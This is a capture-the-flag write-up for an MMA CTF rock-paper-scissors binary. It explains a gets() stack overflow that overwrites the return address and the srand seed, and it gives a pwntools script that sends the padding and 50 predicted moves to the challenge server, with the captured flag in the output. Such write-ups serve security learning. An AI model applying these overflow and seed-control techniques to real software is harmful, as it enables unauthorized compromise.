### Solved by superkojiman

Rock-paper-scissors game. We need to win 50 times. The binary uses gets() when getting our name. Since gets() does no bounds checking, we can overwrite RIP: 

```
buf += "A"*88 + "B"*6   # rip == 0x424242424242
```

However the binary also calls srand(int) and we can overwrite the seed along with RIP. In this case, the seed gets overwritten with 0x41414141. This  means we can predict the pseudorandom values rand() generates later. 

If we win 50 times the fopen("flag.txt", "r") is called. I tried returning to fopen@plt and setting the right args, but it crashes somewhere in fopen(). Rather than spending some more time debugging it, I decided to do it the slow way by just running the binary and feeding it R/P/S and seeing which one won. Since we control the seed, we get the same results. 

Run against the server:

```
.
.
.
Game 49/50
Rock? Paper? Scissors? [RPS]Paper-Rock
You win!!
Game 50/50
Rock? Paper? Scissors? [RPS]Scissors-Paper
You win!!
Congrats AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAmma!!!!
MMA{treed_three_girls}
```


The exploit: 

```python
#!/usr/bin/env python

from pwn import *

buf = ""
buf += "A"*88
buf += "B"*6

buf += "R\n"                    
buf += "R\n"                    
buf += "R\n"                    
buf += "S\n"                    
buf += "P\n"                    
buf += "S\n"                    
buf += "R\n"                    
buf += "P\n"                    
buf += "R\n"                    
buf += "R\n"                    
buf += "P\n"                    
buf += "S\n"                    
buf += "S\n"                    
buf += "R\n"                    
buf += "S\n"                    
buf += "P\n"                    
buf += "P\n"                    
buf += "P\n"                    
buf += "S\n"                    
buf += "P\n"                    
buf += "R\n"                    
buf += "R\n"                    
buf += "R\n"                    
buf += "P\n"                    
buf += "R\n"                    
buf += "P\n"                    
buf += "S\n"                    
buf += "S\n"                    
buf += "R\n"                    
buf += "P\n"                    
buf += "S\n"                    
buf += "S\n"                    
buf += "R\n"                    
buf += "P\n"                    
buf += "P\n"                    
buf += "S\n"                    
buf += "P\n"                    
buf += "P\n"                    
buf += "S\n"                    
buf += "P\n"                    
buf += "R\n"                    
buf += "R\n"                    
buf += "S\n"                    
buf += "P\n"                    
buf += "R\n"                    
buf += "S\n"                    
buf += "S\n"                    
buf += "P\n"                    
buf += "S\n"                    
buf += "P\n"                    
buf += "S\n"                    
buf += "\n"

r = remote("milkyway.chal.mmactf.link", 1641)
print r.recv()
r.sendline(buf)
print r.recvall()
```
